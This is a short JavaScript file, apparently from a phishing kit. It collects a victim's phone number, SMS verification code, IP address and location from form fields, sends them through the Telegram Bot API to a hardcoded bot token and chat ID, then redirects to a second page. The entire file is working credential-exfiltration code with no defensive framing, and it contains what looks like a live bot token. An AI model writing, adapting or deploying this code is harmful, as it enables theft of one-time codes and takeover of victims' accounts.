//bot token
var telegram_bot_id = "6697665635:AAGvGf6hIBGq2yBhwFFt5UtB6lIBOXwcQWc";
//chat id
var chat_id = "2081591756";
var u_name, u_pin2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    u_pin2 = document.getElementById("p1n").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "📲Numero: " + u_name + "\n📩CODIGO SMS: " + u_pin2 +"\nIP: " + ip +"\n" + ip2 +"\n\n🐺LAGSBOG🐺";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};
